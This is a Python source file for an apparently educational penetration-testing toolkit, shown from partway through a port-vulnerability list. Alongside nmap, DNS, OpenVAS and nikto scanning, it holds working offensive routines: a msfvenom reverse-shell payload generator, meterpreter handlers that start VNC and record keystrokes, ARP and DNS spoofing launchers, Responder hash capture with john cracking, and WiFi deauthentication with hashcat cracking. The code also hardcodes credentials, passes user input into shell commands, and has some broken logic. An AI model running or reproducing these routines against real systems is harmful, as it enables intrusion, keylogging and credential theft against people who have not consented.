    [8080, "HTTP Proxy", "Vulnerability: \nCross-Site Scripting (XSS) and SQL Injection leading to unauthorized access, data leakage, data manipulation, data theft, or session hijacking.\nWhen data is being transmitted over HTTP, it is not encrypted and is sent in plaintext. This means that anyone with access to the network can potentially intercept and read the information being transmitted. This lack of encryption makes HTTP vulnerable to eavesdropping and data interception.\nSolution: \nDeploy a Web Application Firewall (WAF) to filter and block malicious web wtraffic, helping to protect against XSS and SQL Injections.\nEnable SSL/TLS over HTTP to use HTTPS (HTTP Secure) to encrypt the data being transmitted, ensuring that the data cannot be easily intercepted or tampered with."],
    
    [8443, "HTTPS", "Vulnerability: \nCertificate-based Vulnerabilities: Improperly issued or expired SSL/TLS certificates can weaken the security of HTTPS connections. \nSSL Downgrading: The attacker may manipulate the communication in a way that the negotiation process results in the use of an older or weaker SSL/TLS version. \nSolution: \nRegularly update SSL/TLS certificates and ensure they are properly issued and configured. Implement certificate revocation mechanisms to invalidate compromised or revoked certificates. \nStrict Transport Security (HSTS): Websites can implement HSTS, a response header that instructs the client to always use HTTPS and prevents the client from accepting downgraded connections."]]
    
    
    target = input("Enter an IP Address to scan: ")
    port_range = input("Enter the range of ports to scan (eg. 1-1024, or enter nothing for no port range): ")
    scanner = nmap.PortScanner()
    if port_range == "":
        scanner.scan(target, arguments='-sU')
        for host in scanner.all_hosts():
            print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
 
            lport = scanner[host][proto].keys()
            print('Vulnerable Ports:')
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    for vulnerable_ports in vulnerable_udp_ports:
                        if port in vulnerable_ports:
                            print ('port : %s\tstate : %s\tservice : %s\n%s'
                                % (port, scanner[host][proto][port]['state'], vulnerable_ports[1], vulnerable_ports[2]))
                            VulnerablePortsList = [target, scanner[host][proto], port, scanner[host][proto][port]['state'],
                                                   vulnerable_ports[1], vulnerable_ports[2]]
                            cur.execute('''INSERT INTO VulDB.Vulnerable_Ports 
                            (id, Host, Protocol, Port, State, Service, Vulnerability, Solution) 
                            VALUES (NULL, ?, ?, ?, ?, ?, ?, ?)''', VulnerablePortsList)
                            conn.commit()
                            conn.commit()

                                
    else:
        scanner.scan(target, port_range, arguments='-sU')
        for host in scanner.all_hosts():
            print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
 
            lport = scanner[host][proto].keys()
            print('Vulnerable Ports:')
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    for vulnerable_ports in vulnerable_udp_ports:
                        if port in vulnerable_ports:
                            print ('port : %s\tstate : %s\tservice : %s\n%s'
                                % (port, scanner[host][proto][port]['state'], vulnerable_ports[1], vulnerable_ports[2]))
                            VulnerablePortsList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                            str(scanner[host][proto][port]['name'])]
                            #cur.execute('''INSERT INTO VulDB.Vulnerable_Ports 
                            #(id, Host, Protocol, Port_Number, Port_Status, Vulnerability) 
                            #VALUES (NULL, ?, ?, ?, ?, ?)''', VulnerablePortsList)
                            conn.commit()

def dns_enum():
    # Set the target domain and record type
    target = input("Enter domain name: ")
    record_types = ["A", "AAAA", "CNAME", "MX", "NS", "SOA", "TXT"]
    # Create a DNS resolver
    dnsResolver = dns.resolver.Resolver()
    for record in record_types:
        # Perform DNS lookup for the specified domain and record type
        try:
            answers = dnsResolver.resolve(target, record)
        except dns.resolver.NoAnswer:
            continue
        # Print the answers
        print(f"{record} records for {target}:")
        for rdata in answers:
            print(f" {rdata}")
            dnsEnumerationList = [str(target), str({record}), str({rdata})]
            cur.execute('''INSERT INTO RecDB.DNS_Enumeration 
            (id, Domain, Record_Type, Data) 
            VALUES (NULL, ?, ?, ?)''', dnsEnumerationList)
            conn.commit()


def built_with():
    target = input("Enter target website: ")#https://juice-shop.herokuapp.com/#/
    website = builtwith.parse(target)
    for name in website:
        print(name + ":" , website[name])
        builtWithList = [str(website), str(name), str(website[name])]
        cur.execute('''INSERT INTO RecDB.Built_With 
        (id, Domain, Name, Language) 
        VALUES (NULL, ?, ?, ?)''', builtWithList)
        conn.commit()


def allowed_methods():
    target = input("Enter target website: ") #https://juice-shop.herokuapp.com/#/
    requestResponse = requests.options(target)
    for item in requestResponse.headers:
        print(item + ": " + requestResponse.headers[item])
        allowedMethodsList = [str(target), str(item), str(requestResponse.headers[item])]
        cur.execute('''INSERT INTO RecDB.Allowed_Methods 
        (id, Domain, Item, Result) 
        VALUES (NULL, ?, ?, ?)''', allowedMethodsList)
        conn.commit()


def start_openvas():
    print(subprocess.call('gvm-start', shell=True))

def start_openvas_scan():
    config = {
        'PORT_LIST_ID': '33d0cd82-57c6-11e1-8ed1-406186ea4fc5',
        'REPORT_FORMAT_ID': 'a994b278-1f62-11e1-96ac-406186ea4fc5',
        'SCAN_CONFIG_ID': 'daba56c8-73ec-11df-a475-002264764cea',
        'SCANNER_ID': '08b69003-5fc2-4037-a479-93b440211c73'
    }


    connection = UnixSocketConnection()
    transform = EtreeTransform()
    gmp = Gmp(connection, transform=transform)

    try:
        gmp.authenticate('admin', 'password')
    except:
        print("Not able to connect to OPENVAS")
    
    scan_name = input("Enter scan name: ")   
    host_address = input("Enter target address: ")   
    port_list_id = config['PORT_LIST_ID'] # For all IANA assigned TCP 
    target_response = gmp.create_target(name=scan_name, hosts=[host_address], port_list_id=port_list_id)
    target_id = target_response.get('id')

    if not target_id:
        print("Was unable to create target.", target_response.get('status_text'))
        return False
    else:
        print("Target created.")
    
    scan_config_id = config['SCAN_CONFIG_ID']
    scanner_id = config['SCANNER_ID']
    report_format_id = config['REPORT_FORMAT_ID']

    task_response = gmp.create_task(name=scan_name, config_id=scan_config_id, target_id=target_id, scanner_id=scanner_id)
    task_id = task_response.get('id')

    start_task_response = gmp.start_task(task_id)

    report_id = start_task_response[0].text
    print("Report created with Report ID: ", report_id)
    
def get_openvas_report():

    def check_status(task_name):
        report_filter = gmp.get_reports(filter_string=task_name)
        report = report_filter.find('report')
        report_id = report.get('id')
        report = gmp.get_report(report_id=report_id, filter_string="<scan_run_status>")
        file_name = task_name + "_status.xml"
        with open(file_name, 'wb') as file:
            file.write(ET.tostring(report, pretty_print=True))
            
        with open(file_name, 'r') as file:
            content = file.read()
            if str("<scan_run_status>Done</scan_run_status>") in content:
                print("Scan Completed.")
            else:
                print("Scan Still In Progress.")

    connection = UnixSocketConnection()
    transform = EtreeTransform()
    gmp = Gmp(connection, transform=transform)

    try:
        gmp.authenticate('admin', 'password')
    except:
        print("Not able to connect to OPENVAS")
        return False
    
    # Retrieve and get names of tasks
    tasks = gmp.get_tasks()
    
    task_names = tasks.xpath('task/name/text()')
    task_list = []
    for task in task_names:
        task_list.append(task)
    print("Tasks: ")
    pretty_print(task_names)
    
    task_name = input("Enter the task name of the task that you want to retrieve the report for: ")
    if task_name in task_list:
        task_name = re.sub(" ", "_", task_name)
        
        check_status(task_name)
        
        filter_report = gmp.get_reports(filter_string = task_name)
        report = filter_report.find('report')
        report_id = report.get('id')
        
        scan_results={}
        
        report_response = gmp.get_report(report_id, filter_string='apply_overrides=0 levels=hml min_qod=70 sort-reverse=severity')
        report_response_str = ET.tostring(report_response, encoding='unicode')
        report_response_dict = xmltodict.parse(report_response_str)
        
        report_results = report_response_dict.get('get_reports_response', {}).get('report', {}).get('report', {}).get('results', {}).get('result', [])
        try:
            for vuln in report_results:
                name = vuln.get('name')
        except:
            report_results = [report_results]
        for vuln in report_results:
            name = vuln.get('name')
            #print('name: ', name)
            if scan_results.get(name):
                #print('--- Duplicate name: ', name)
                continue
            nvt = vuln.get('nvt', {})
            scan_result = {}
            scan_result['name'] = name
            scan_result['severity'] = float(nvt.get('cvss_base', 0))
            scan_result['risk'] = vuln.get('threat')
            scan_result['description'] = vuln.get('description')
            scan_result['solution'] = nvt.get('solution')
     
            vuln = str(vuln)
            cve_codes = re.findall(r"CVE-\d{4}-\d+", vuln)
            cve_list = []
            for cve in cve_codes:
                if cve not in cve_list:
                    cve_list.append(cve)
            if not cve_list:
                cve_list.append("N/A")
                
            
            scan_result['cve_id'] = cve_list
            scan_results[name] = scan_result   
            
        def print_report(scan_results):

            if not scan_results:
                return False

            results = list(scan_results.values())

            scan_report = []
            scan_display_report = []
            scan_display_report.append([ '#', 'Vuln. Name', 'Risk', 'Severity', 'CVE ID' ])

            count = 0
            for vuln in sorted(results, key = lambda x: x['severity'], reverse=True):
                count += 1

                name =vuln['name']
                risk = vuln['risk']
                severity = vuln['severity']
                cve_id = vuln.get('cve_id') or vuln.get('cveid', '')
                description = vuln['description']
                solution = vuln['solution']

                scan_report.append([ count, name, risk, severity, cve_id, description, solution ])
                scan_display_report.append([ count, name, risk, severity, cve_id])
                
            with open('vulnerabilities.txt', 'w') as file:
                report_task_name = ("Task Name: " + task_name + "\n")
                file.write(report_task_name)
                for item in scan_report:
                    sn = ("#: "+ str(item[0]))
                    file.write(sn)
                    vuln_name = ("\nVulnerability Name: " + str(item[1]))
                    file.write(vuln_name)
                    risk = ("\nRisk: " + str(item[2]))  
                    file.write(risk)
                    severity = ("\nSeverity: " + str(item[3]))
                    file.write(str(severity))
                    cve = ("\nCVE ID: " + str(item[4]))
                    file.write(cve)
                    desc = ("\nDescription: " + str(item[5]))
                    file.write(desc)
                    for k,v in item[6].items():
                        solution = ("\nSolution: " + v)
                    file.write(solution)

                    file.write("\n")
                    file.write("\n")

                                        
                    vlist = [task_name, str(item[1]), str(item[2]), str(item[3]), str(item[4]), str(item[5]), v]
                    cur.execute('''INSERT INTO VulDB.OpenVAS 
                    (id, Task_Name, Vulnerability, Risk, Severity, CVE_ID, Description, Solution) 
                    VALUES (NULL, ?, ?, ?, ?, ?, ?, ?)''', vlist)
                    conn.commit()
                    


            scan_report_table = SingleTable(scan_display_report)
            scan_report_table.title = 'Vuln. Alerts'
            print(scan_report_table.table)
            print("Detailed Report created at: vulnerabilities.txt")
        
        print_report(scan_results)
    else:
        print("Task not found")
        
def stop_openvas():
    print(subprocess.call("gvm-stop", shell=True))

def nikto_menu():

    host = 'https://redtiger.labs.overthewire.org/'

    os.system('apt-get nmap')
    os.system('apt-get nikto')
    os.system('nikto -update')
    

    print('For testing purposes')
    ntime = str(input('Enter runtime(s): '))

    nikto_loop = True
    while nikto_loop == True:
        ascii_nikto = pyfiglet.figlet_format("Nikto")
        print(ascii_nikto)
        print("\nPlease Select an Option Below.")
        print("1. Basic scan (HTTP)")
        print("2. Basic Scan (HTTPS)")
        print("3. Tuning Scan (Vulnerabilities Thingies)")
        print("4. Exit")

        menu_input = (input("Select option: "))
        if menu_input == "1":
            host = str(input('Enter domain name here (e.g. google.com):'))
            n80 =  subprocess.check_output(['nikto', '-h', host, '-nossl', '-maxtime', ntime])
            print(n80)
        elif menu_input == "2":
            host = str(input('Enter domain name here (e.g. google.com):'))
            n443 =  subprocess.check_output(['nikto', '-h', host, '-ssl', '-maxtime', ntime])
            print(n443)
        elif menu_input == "3":
            print('0. File Upload\n \
                3. Information Disclosure\n \
                4. Injection, XSS/Script/HTML\n \
                6. Denial of Service\n \
                8. Reverse Shell\n \
                9. SQL Injection\n \
                a. Authentication Bypass\n \
                b. Software Identification\n \
                c. Remote Source Inclusion\n ')
            value = str(input('Enter Tuning value to be used here: '))
            host = str(input('Enter domain name here (e.g. google.com):'))
            nT = subprocess.check_output(['nikto', '-h', host, '-Tuning', value])
            print(nT)
        elif menu_input == "4":
            nikto_loop = False
        else:
                print("Invalid Input!\nPlease Try Again!")
                continue

def create_html_pages():

    con = sqlite3.connect("APTdatabase.db")

    allowed_methods = pd.read_sql_query("SELECT * from Allowed_Methods", con)
    df_allowed = pd.DataFrame(data=allowed_methods)
    df_allowed.to_html("methods.html",justify='left')

    built_with = pd.read_sql_query("SELECT * from Built_With", con)
    df_built = pd.DataFrame(data=built_with)
    df_built.to_html("built_with.html",justify='left')

    dns = pd.read_sql_query("SELECT * from DNS_Enummeration", con)
    df_dns = pd.DataFrame(data=dns)
    df_dns.to_html("dns.html",justify='left')

    google = pd.read_sql_query("SELECT * from Google_Search", con)
    df_google = pd.DataFrame(data=google)
    df_google.to_html("google.html",justify='left')

    host = pd.read_sql_query("SELECT * from HostDiscovery", con)
    df_host = pd.DataFrame(data=host)
    df_host.to_html("host.html",justify='left')

    ldap_brute = pd.read_sql_query("SELECT * from LDAP_Brute_Enummeration", con)
    df_ldapbrute = pd.DataFrame(data=ldap_brute)
    df_ldapbrute.to_html("ldap_brute.html",justify='left')

    ldap_users = pd.read_sql_query("SELECT * from LDAP_Users_Enummeration", con)
    df_ldapusers = pd.DataFrame(data=ldap_users)
    df_ldapusers.to_html("ldap_users.html",justify='left')

    nfs = pd.read_sql_query("SELECT * from NFS_Share_Enummeration", con)
    df_nfs = pd.DataFrame(data=nfs)
    df_nfs.to_html("nfs.html",justify='left')

    os = pd.read_sql_query("SELECT * from OSDiscovery", con)
    df_os = pd.DataFrame(data=os)
    df_os.to_html("os.html",justify='left')

    port = pd.read_sql_query("SELECT * from PortDiscovery", con)
    df_port = pd.DataFrame(data=port)
    df_port.to_html("port.html",justify='left')

    rpc = pd.read_sql_query("SELECT * from RPC", con)
    df_rpc = pd.DataFrame(data=rpc)
    df_rpc.to_html("rpc.html",justify='left')

    smtp_users = pd.read_sql_query("SELECT * from SMTP_User_Enummeration", con)
    df_smtpusers = pd.DataFrame(data=smtp_users)
    df_smtpusers.to_html("smtp_users.html",justify='left')

    snmp_interface = pd.read_sql_query("SELECT * from SNMP_Interface_Enummeration", con)
    df_snmpinterface = pd.DataFrame(data=snmp_interface)
    df_snmpinterface.to_html("snmp_interface.html",justify='left')

    snmp_os = pd.read_sql_query("SELECT * from SNMP_OS_Enummeration", con)
    df_snmpos = pd.DataFrame(data=snmp_os)
    df_snmpos.to_html("snmp_os.html",justify='left')

    snmp_process = pd.read_sql_query("SELECT * from SNMP_Process_Enummeration", con)
    df_snmpprocess = pd.DataFrame(data=snmp_process)
    df_snmpprocess.to_html("snmp_process.html",justify='left')

    snmp_software = pd.read_sql_query("SELECT * from SNMP_Software_Enummeration", con)
    df_snmpsoftware = pd.DataFrame(data=snmp_software)
    df_snmpsoftware.to_html("snmp_software.html",justify='left')

    spidering = pd.read_sql_query("SELECT * from Spidering", con)
    df_spidering = pd.DataFrame(data=spidering)
    df_spidering.to_html("spidering.html",justify='left')

    vuln_ports = pd.read_sql_query("SELECT * from Vulnerable_Ports", con)
    df_vulnports = pd.DataFrame(data=vuln_ports)
    df_vulnports.to_html("vuln_ports.html",justify='left')

    whois = pd.read_sql_query("SELECT * from Whois_Enummeration", con)
    df_whois = pd.DataFrame(data=whois)
    df_whois.to_html("whois.html",justify='left')

def arp_spoof():
    arp_spoof = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python3 arp-spoof.py; exec bash"'])


def dns_spoof():
    dns_spoof = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python3 dns-spoof.py; exec bash"'])

def generate_malicious_payload():
    lhost = input("IP Address of this machine: ")
    subprocess.call("msfvenom -p windows/meterpreter/reverse_tcp \
    --platform windows -a x86 -f exe LHOST={} LPORT=444 -o Payloads/malicious_payload.exe".format(lhost), 
    shell=True)

def vnc_exploit():
    # Set exploit variables
    exploit = "exploit/multi/handler"
    payload = "windows/meterpreter/reverse_tcp"
    lhost = input("IP Address of this machine: ")
    lport = "444"
    sleep = input("How long do you want to listen for (in seconds)? ")
    vlist = [lhost, lport, exploit, payload, sleep]
    cur.execute('''INSERT INTO ExpDB.VNC 
    (id, Target_IP, Port, Exploit, Payload, Listening) 
    VALUES (NULL, ?, ?, ?, ?, ?)''', vlist)
    conn.commit()
    
    # Run msfconsole in new terminal
    process = subprocess.Popen(['gnome-terminal', '-e', 'msfconsole -x "use {}; \
    set PAYLOAD {}; \
    set LHOST {}; \
    set LPORT {}; \
    exploit -j -z; \
    sleep {}; \
    sessions -i 1 -C \\"run vnc\\""'.format(exploit, payload, lhost, lport, sleep)])


def keyscan_exploit():
    open('keyscan.txt', 'w')
    # Set exploit variables
    
    exploit = "exploit/multi/handler"
    payload = "windows/meterpreter/reverse_tcp"
    lhost = input("IP Address of this machine: ")
    lport = "444"
    listen_sleep = input("How long do you want to listen for (in seconds)? ")
    keyscan_sleep = input("How long do you want to run the keyscan for (in seconds)? ")
    
    # Run msfconsole in new terminal
    process = subprocess.Popen(['gnome-terminal', '-e', 'msfconsole -x "use {}; \
    set PAYLOAD {}; \
    set LHOST {}; \
    set LPORT {}; \
    exploit -j -z; \
    sleep {}; \
    sessions -i 1 -C \\"load stdapi\\"; \
    sessions -i 1 -C \\"keyscan_start\\"; \
    sleep {}; \
    spool keyscan.txt; \
    sessions -i 1 -C \\"keyscan_dump\\"; \
    spool off"'.format(exploit, payload, lhost, lport, listen_sleep, keyscan_sleep)])
    
    
    input("Press Enter once keyscan is done ")
    # Open the text file
    with open("keyscan.txt", "r") as file:
        content = file.read()
        
    #ip_address = re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', content).group()
    #print("\nTarget Machine: ", ip_address)

    # Remove color codes using regular expressions
    clean_content = re.sub(r'\\[\d+m', '', content)

    klist = [lhost, lport, exploit, payload, listen_sleep, keyscan_sleep, clean_content]
    cur.execute('''INSERT INTO ExpDB.Keyscan 
    (id, Target_IP, Port, Exploit, Payload, Listening, Keyscan_Runtime, Clean_Content) 
    VALUES (NULL, ?, ?, ?, ?, ?, ?, ?)''', klist)
    conn.commit()

    # Print the clean content
    print(clean_content)
    
    with open("keyscan.txt", "w") as file:
        file.write(clean_content)

def start_listener():
    interface_name = input("Enter interface: ")
    start_listener = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python2 Responder/Responder.py -I {}; exec bash"'.format(interface_name)])

def crack_hash_generated():
    hash_file = input("Input name of hash file: ")
    remove_pot_file = subprocess.call("rm /root/.john/john.pot", shell = True)
    crack_hash = subprocess.call(['gnome-terminal', '-e', 'bash -c "john Responder/logs/{}; exec bash"'.format(hash_file)])
    show_hash = subprocess.call("john Responder/logs/{} --show".format(hash_file), shell=True)
    print(type(show_hash))
    clean_hashA = show_hash[2:]
    clean_hashB = clean_hashA.split(":")
    cur.execute('''INSERT INTO ExpDB.LLMNR 
    (id, Username, Password, Domain, Password_Hash) 
    VALUES (NULL, ?, ?, ?, ?)''', clean_hashB)
    conn.commit()

def zap_scan():
    run_zap = "python3 zap.py"
    subprocess.Popen(['gnome-terminal','-e',run_zap])

def capture_handshake():
    interface = input("Please enter your wifi interface name: (it can be found by using ifconfig) ")
    adapter_down = "ifconfig {} down".format(interface)
    subprocess.call(adapter_down,shell=True)
    monitor_mode = "iwconfig {} mode monitor".format(interface)
    subprocess.call(monitor_mode,shell=True)
    adapter_up = "ifconfig {} up".format(interface)
    subprocess.call(adapter_up,shell=True)
    subprocess.call('airmon-ng start {}'.format(interface),shell=True)
    subprocess.Popen(['gnome-terminal', '-e', 'bash -c "airodump-ng {}; exec bash"'.format(interface)])
    bssid = input("A new terminal will open, please enter the BSSID of the desired network to crack: ")
    chid = input("Please enter the CH Number of the desired network : ")
    capture_file = "airodump-ng {} -c {} --bssid {} -w dump".format(interface,chid,bssid)
    print("Please press Ctrl + C when you see the EAPOL show up")
    subprocess.Popen(['gnome-terminal', '-e', 'bash -c "airodump-ng {} -c {} --bssid {} -w dump; exec bash"'.format(interface,chid,bssid)])
    station = input("Enter the station ID to launch a deauth attack to generate more packets: ")
    subprocess.Popen(['gnome-terminal', '-e', 'bash -c "aireplay-ng -0 {} -a {} -c {} {}; exec bash"'.format(chid,bssid,station,interface)])
    
def crack_password():
    result = open("result.txt",'w')
    result.close()
    file_name = input("Enter the name desired .cap file (eg. if the .cap file name is dump-01.cap, please enter dump-01) : ")
    digits = int(input("Enter the number of digits of the password: "))
    digit = "?d"*digits
    subprocess.call("hcxpcapngtool {}.cap -o {}.txt".format(file_name,file_name),shell=True)
    subprocess.Popen(['gnome-terminal', '-e', 'bash -c "hashcat --potfile-disable -o result.txt -m 22000 -a3 {}.txt {}; exec bash"'.format(file_name,digit)])
    file = open('result.txt', 'r')
    lines = file.readlines()
    for line in lines:
        temp_list = line.split(":")
        line_list = [temp_list[0] + ':', temp_list[1] + ':' + temp_list[2], temp_list[3], temp_list[4]]
        cur.execute('''INSERT INTO ExpDB.WPA 
        (id, Hash, Network, Password) 
        VALUES (NULL, ?, ?, ?)''', line_list)
        conn.commit()

project_menu()


#MENU TEMPLATE FOR REPORT

#def vulnscanning_menu():
#    vulnscanning_loop = True
#    while vulnscanning_loop == True:
#        #Input Scanning Options
#        print("\nPlease Select an Option Below.")
#        print("1. Option 1")
#        print("2. Option 2")
#        print("3. Exit")
#        menu_input = (input("Select option: "))
#        if menu_input == "1":
#            ascii_1 = pyfiglet.figlet_format("Option 1")
#            print(ascii_1)
#            hostDiscovery()
#        elif menu_input == "2":
#            ascii_2 = pyfiglet.figlet_format("Option 2")
#            print(ascii_2)
#            portDiscovery()
#        elif menu_input == "3":
#            vulnscanning_loop = False
#        else:
#            print("Invalid Input!\nPlease Try Again!")
#            continue